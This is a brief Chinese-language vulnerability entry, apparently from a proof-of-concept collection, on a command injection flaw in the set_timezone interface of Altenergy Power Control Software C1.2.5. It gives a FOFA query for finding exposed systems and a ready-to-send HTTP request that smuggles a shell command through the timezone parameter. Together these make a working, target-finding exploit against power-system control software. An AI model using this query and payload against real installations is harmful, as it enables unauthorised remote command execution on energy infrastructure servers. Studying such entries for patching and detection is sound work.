# Altenergy电力系统控制软件set_timezone接口存在远程命令执行漏洞

电力系统控制软件 Altenergy Power Control Software C1.2.5版本的系统/set_timezone接口存在命令注入漏洞，攻击者可执行任意命令获取服务器权限。

## fofa

```yaml
title="Altenergy Power Control Software"
```

## poc

```java
POST /index.php/management/set_timezone HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 
timezone=`id > rce.txt`
```

![image-20240820204404636](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408202044765.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/Zf5Jrr2pozEBVxBaV8BsgQ